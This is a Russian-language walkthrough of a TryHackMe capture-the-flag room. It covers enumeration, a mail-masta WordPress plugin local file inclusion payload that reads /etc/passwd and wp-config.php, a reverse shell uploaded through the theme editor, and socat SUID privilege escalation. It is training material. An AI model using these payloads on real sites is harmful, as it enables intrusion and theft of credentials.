# All in One

:white_check_mark: [**Wpscan plugins enum**](#wpscan_plugins)

:white_check_mark: [**Wordpress mail-masta exploit**](#mail-masta)

:white_check_mark: [**Socat(privesc)**](#socat)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV all.thm
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.61.235
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Подключившись к ftp ничего не было найдено.

Главная страница all.thm:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/1.png)

Сбрутим директории all.thm:
```
gobuster dir -u http://all.thm/ -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```

```
/index.html           (Status: 200) [Size: 10918]
/wordpress            (Status: 301) [Size: 306] [--> http://all.thm/wordpress/]
```

Страница all.thm/wordpress/:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/2.png)

<a name="wpscan_plugins"></a>

Используем wpscan, чтобы перебрать пользователей и увидеть возможные уязвимости:
```
wpscan --url http://all.thm/wordpress --enumerate u
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/3.png)

<a name="mail-masta"></a>

```
wpscan --url http://all.thm/wordpress --enumerate ap
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/4.png)

Найдем [эксплоит](https://www.exploit-db.com/exploits/40290) **mail-masta**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/5.png)

Сам эксплоит:
```
http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Нужно модифицировать его, чтобы достать wp-config.php. В интернете я нашел данную [статью](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/). Теперь наш экплоит будет выглядеть так:
```
http://all.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

Получаем конфиг.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/6.png)

Раздекодив конфиг, получаем пароль от пользователя elyana.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/7.png)

Переходим в директорию /wordpress/wp-admin/ и логинимся.

Переходим в редактор тем и переключаем тему на twentyseventeen. Затем в 404.php заливаем php reverse shell.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/16.png)

Запускаем слушаель и открываем наш файл:
```
http://all.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

Получаем shell

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/8.png)

Перейдем в домашнюю директорию elyana. У нас нет доступа к user.txt, но нам оставили подсказку, что пароль от пользователя находится где-то в системе.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/9.png)

Запустив linpeas я нашел странный файл. В нем оказался пароль от пользователя.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/10.png)

Заходим под пользователя Elyana.

Также linpeas выявил ряд уязвимостей.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/11.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/12.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/13.png)

<a name="socat"></a>

Мы будем использовать уязвимость SUID для socat. Для этого на сайте [GTFOBins](https://gtfobins.github.io/gtfobins/socat/) найдем эксплоит.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/14.png)

Используем команду и получаем рута.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/All_in_One/15.png)
